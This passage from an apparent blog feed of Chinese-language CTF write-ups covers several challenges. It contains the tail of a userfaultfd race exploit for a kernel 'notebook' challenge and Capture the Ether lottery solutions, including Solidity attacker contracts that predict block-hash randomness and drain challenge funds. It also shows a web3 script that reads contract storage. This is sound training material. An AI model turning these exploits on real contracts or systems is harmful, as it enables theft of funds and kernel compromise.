class="number">0</span>, <span class="number">0x500</span>, zero);<span class="comment">// 第一个edit free掉vuln chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x400</span>, zero);<span class="comment">// 第二个edit 确保size不变</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) != <span class="keyword">sizeof</span>(msg))</span><br><span class="line">errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">uc.src = (<span class="type">unsigned</span> <span class="type">long</span>)zero;</span><br><span class="line">uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page;</span><br><span class="line">uc.len = fault_page_len;</span><br><span class="line">uc.mode = <span class="number">0</span>;</span><br><span class="line">ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">Done(<span class="string">&quot;ioctl done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;notebook的多种解法&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#notebook的多种解法&quot;&gt;#&lt;/a&gt; notebook 的多种解法&lt;/h1&gt;
&lt;p&gt;2021 QWB&lt;/p&gt;
&lt;p&gt;这个题就是考锁没加好的多线程条件竞争&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="https://squirre17.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://squirre17.github.io/tags/Linux/"/>
    
    <category term="Kernel state" scheme="https://squirre17.github.io/tags/Kernel-state/"/>
    
  </entry>
  
  <entry>
    <title>Capture-the-ether-Lotteries-wp</title>
    <link href="https://squirre17.github.io/2022/09/02/Capture-the-ether-Lotteries-wp/"/>
    <id>https://squirre17.github.io/2022/09/02/Capture-the-ether-Lotteries-wp/</id>
    <published>2022-09-02T03:23:12.000Z</published>
    <updated>2022-09-30T01:52:00.458Z</updated>
    
    <content type="html"><![CDATA[<h2 id="guess-the-secret-number"><a class="markdownIt-Anchor" href="#guess-the-secret-number">#</a> Guess the secret number</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash = <span class="number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">GuessTheSecretNumberChallenge</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">guess</span><span class="params">(uint8 n)</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (keccak256(n) == answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题外话 这里是低版本的构造函数 需要创建的时候就打一个 ether</p><p>8 位的 keccak<br> 爆破即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract solution&#123;</span><br><span class="line">    bytes32 answerHash = <span class="number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class="line">    uint public x;</span><br><span class="line">    function <span class="title function_">answer</span><span class="params">()</span> public <span class="title function_">returns</span><span class="params">(uint8)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint8 i = <span class="number">0</span> ; i &lt; <span class="number">2</span>**<span class="number">8</span> ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(keccak256(i) == answerHash)</span><br><span class="line">            &#123;</span><br><span class="line">                x = i;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>**<span class="number">8</span><span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="guess-the-random-number"><a class="markdownIt-Anchor" href="#guess-the-random-number">#</a> Guess the random number</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">GuessTheRandomNumberChallenge</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">        answer = uint8(keccak256(block.blockhash(block.number - <span class="number">1</span>), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">guess</span><span class="params">(uint8 n)</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个合约有点老了<br> In short  <code>now</code>  is just an alias for  <code>block.timestamp</code> <br> 如果在 remix 上部署需要改一下 <code>block.number - 1</code>  不然会 pending<br> <code>block.blockhash()</code>  is now  <code>blockhash()</code>  and  <code>now</code>  is  <code>block.timestamp</code> . We’ll see this further on.</p><p>timestamp 和 block 信息都在区块链探索器上可见</p><p><img src="/2022/09/02/Capture-the-ether-Lotteries-wp/1.png" alt></p><p><img src="/2022/09/02/Capture-the-ether-Lotteries-wp/2.png" alt><br>timestamp <a href="https://www.epochconverter.com/">Epoch Converter - Unix Timestamp Converter</a><br> 我想用 <code>interface</code>  与合约交互 结果失败了（不知道原因<br><a href="https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347"> Capture Ether: Guess the Random Number on a Smart Contract | by Tomás | Better Programming</a></p><p>所以还是手撸<br>直接读取 Storage 不香吗 (也可以写个 solidity 的 exp 用 interface 来交互)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethers = <span class="built_in">require</span>(<span class="string">&#x27;ethers&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs-extra&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> web3 =  <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&quot;your_rpc_url&quot;</span>)</span><br><span class="line">contractAddr = <span class="string">&quot;your_contract_addr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">cl</span> = x =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">padding</span>(<span class="params">x</span>) &#123;</span><br><span class="line">x = x.<span class="title function_">toString</span>()</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; (<span class="number">64</span> - x.<span class="property">length</span>); i++) &#123;</span><br><span class="line">s += <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">s += x</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getSlot</span>(<span class="params">idx</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> ret = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddr, idx)</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getShaIdx</span>(<span class="params">idx</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> ret = <span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="title function_">padding</span>(idx))</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title function_">cl</span>(<span class="keyword">await</span> <span class="title function_">getSlot</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>()</span><br><span class="line">.<span class="title function_">then</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">0</span>))</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(err),</span><br><span class="line">process.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="guess-the-new-number"><a class="markdownIt-Anchor" href="#guess-the-new-number">#</a> Guess the new number</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function <span class="title function_">GuessTheNewNumberChallenge</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">guess</span><span class="params">(uint8 n)</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - <span class="number">1</span>), now));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没法在内存看了 只能嗯计算<br>关于 now 关键字<a href="https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties"> documentation</a><br> 就是 timestamp</p><p>根据 upon 大佬提醒 blockhash 只在 256 个块之内生效 所以两个块的布置不能间隔太久<br>否则 blockhash 就会返回 0<br> 而且 blockhash 是计算块 hash 如果本地的链没那么长是没法计算的</p><p>如果我们可以在生成第二个区块钱同时执行 exp 合约和目标合约 那么结果也是一样的<br>因为 answer 是调用时才生成<br>直接写个 sol 交互</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Challenge &#123;</span><br><span class="line">function <span class="title function_">guess</span><span class="params">(uint8 n)</span> external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="built_in">exp</span>&#123;</span><br><span class="line">Challenge public cha;</span><br><span class="line">constructor(address addr)&#123;</span><br><span class="line">cha = Challenge(addr);</span><br><span class="line">&#125;</span><br><span class="line">function <span class="title function_">solve</span><span class="params">()</span> public payable&#123;</span><br><span class="line">uint8 ans = uint8(uint256(keccak256(abi.encodePacked(</span><br><span class="line">blockhash(block.number - <span class="number">1</span>), block.timestamp</span><br><span class="line">))));</span><br><span class="line">cha.guess&#123;value: <span class="number">1</span> ether&#125;(ans);</span><br><span class="line">payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">&#125;</span><br><span class="line">receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意 一定要将此合约的钱转出<br> <code>payable(msg.sender).transfer(address(this).balance);</code> <br> 另外一定要有 <code>receive</code>  函数 （没 function ） 来确保有钱转入</p><h2 id="predict-the-future"><a class="markdownIt-Anchor" href="#predict-the-future">#</a> Predict the future</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">PredictTheFutureChallenge</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">lockInGuess</span><span class="params">(uint8 n)</span> public payable &#123;</span><br><span class="line">        require(guesser == <span class="number">0</span>);</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">settle</span><span class="params">()</span> public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - <span class="number">1</span>), now)) % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        guesser = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是我们先要用 <code>lockInGuess</code>  设置 guess 值<br>然后等待 block 增加了 用之前写入的去预测到增加后的块数</p><p>但是之后的块数和时间都是可以预测的 并且只有十种可能性<br>也就是我们可以等到 answer 满足我们的 guess 的时候再调用 <code>settle</code></p><p>注意 如果出现 <code># Transaction mined but execution failed</code> <br> 一定要改 matemask 的 gas limit<br> 不然查 txn 会查出 gas 超了<br><img src="/2022/09/02/Capture-the-ether-Lotteries-wp/3.png" alt><br>这个是借助中介合约一个个试 如果成功了就才调用 solve</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line">import <span class="string">&quot;./challenge.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="built_in">exp</span>&#123;</span><br><span class="line">address owner;</span><br><span class="line">PredictTheFutureChallenge public cha;</span><br><span class="line">uint8 public n;</span><br><span class="line"><span class="type">bool</span> public success;</span><br><span class="line">uint8 public answer;</span><br><span class="line">function <span class="title function_">exp</span><span class="params">(address addr)</span> public &#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">cha = PredictTheFutureChallenge(addr);</span><br><span class="line">&#125;</span><br><span class="line">function <span class="title function_">lockNumber</span><span class="params">(uint8 _n)</span> public payable&#123;</span><br><span class="line">require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">require(_n &lt;= <span class="number">9</span> &amp;&amp; _n &gt;= <span class="number">0</span>);</span><br><span class="line">n = _n;</span><br><span class="line">cha.lockInGuess.value(msg.value)(_n);</span><br><span class="line">&#125;</span><br><span class="line">function <span class="title function_">transfer</span><span class="params">()</span> external payable &#123;</span><br><span class="line">address(this).transfer(msg.value);</span><br><span class="line">&#125;</span><br><span class="line">function <span class="title function_">solve</span><span class="params">()</span> public payable&#123;</span><br><span class="line">answer = uint8(uint256(keccak256(</span><br><span class="line">abi.encodePacked(</span><br><span class="line">block.blockhash(block.number - <span class="number">1</span>), now</span><br><span class="line">)</span><br><span class="line">))) % <span class="number">10</span> ;</span><br><span class="line"><span class="keyword">if</span>(answer == n)&#123;</span><br><span class="line">success = <span class="literal">true</span>;</span><br><span class="line">cha.settle();</span><br><span class="line"><span class="comment">// require(cha.isComplete(), &quot;Wrong answer&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">function <span class="title function_">withdraw</span><span class="params">()</span> external payable&#123;</span><br><span class="line">require(msg.sender == owner);</span><br><span class="line">owner.transfer(address(this).balance);</span><br><span class="line">&#125;</span><br><span class="line">function() public payable &#123;&#125;</span><br><span class="line"><span class="comment">// receive external payable&#123;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="predict-the-block-hash"><a class="markdownIt-Anchor" href="#predict-the-block-hash">#</a> Predict the block hash</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">PredictTheBlockHashChallenge</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">lockInGuess</span><span class="params">(bytes32 hash)</span> public payable &#123;</span><br><span class="line">        require(guesser == <span class="number">0</span>);</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">settle</span><span class="params">()</span> public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是我们需要提前预测 block + 1 的 hash<br> 但是难点是我们调用库 hash 是没法 hash 出下一块 block 的 hash 的</p><blockquote><p>The block hashes are not available for all blocks for scalability reasons.<br>You can only access the hashes of the most recent 256 blocks, all other values will be zero.</p></blockquote><p>但是由于这个清零特性和块数和 hash 是异步分时的<br>只需要等 256 个块挖完了（15s 一个）之前猜个 0 即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;guess-the-secret-number&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#guess-the-secret-number&quot;&gt;#&lt;/a&gt; Guess the secret number&lt;/h2&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="ctf" scheme="https://squirre17.github.io/categories/ctf/"/>
    
    
    <category term="Blockchain" scheme="https://squirre17.github.io/tags/Blockchain/"/>
    
  </entry>
  
  <entry>
    <title>BlockChain-from-scratch-mapping</title>
    <link href="https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/"/>
    <id>https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/</id>
    <published>2022-08-27T08:51:10.000Z</published>
    <updated>2022-10-19T11:21:39.746Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://capturetheether.com/challenges/math/mapping/">Capture the Ether - Mapping</a><br> 从一道题入门 blockchain</p><h2 id="evm存储简介"><a class="markdownIt-Anchor" href="#evm存储简介">#</a> EVM 存储简介</h2><p>solidity 编译后的数据<br>是放在 slot 的结构中<br> slot 有 2 ^ 256 个<br>每一个有 256 位</p><p>对于 solidity 中的可以在编译期间确定的静态元素<br> solc 会将其依次放入内存插槽中（slot）<br><img src="/2022/08/27/BlockChain-from-scratch-mapping/1.png" alt><br>这里 bcd 都是 256 位<br>所以放在 slot [0…2]<br> 但如果是可变长数据结构如果是 array 或者 map<br> 值会被放在其他地方 为了性能 这里是直接对当前的 idx 取 keccak<br> 比如 <code>keccak(0) = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563</code> <br> 如果 <code>slot[0]</code>  是 array 的话 那么数据就会被放在<br> <code>slot[0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563]</code>  里</p><p>注意这里 keccak 是对补齐后的字符串进行 hash 的 而不是对数字<br>所以需要 padding 一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">padding</span>(<span class="params">x</span>) &#123;</span><br><span class="line">x = x.<span class="title function_">toString</span>()</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; (<span class="number">64</span> - x.<span class="property">length</span>); i++) &#123;</span><br><span class="line">s += <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">s += x</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>solidity 同样存在和 c 一样内存对齐的概念 不再赘述</p><h2 id="cte-mapping"><a class="markdownIt-Anchor" href="#cte-mapping">#</a> cte-mapping</h2><p>首先看合约 map 的 kv 可控</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 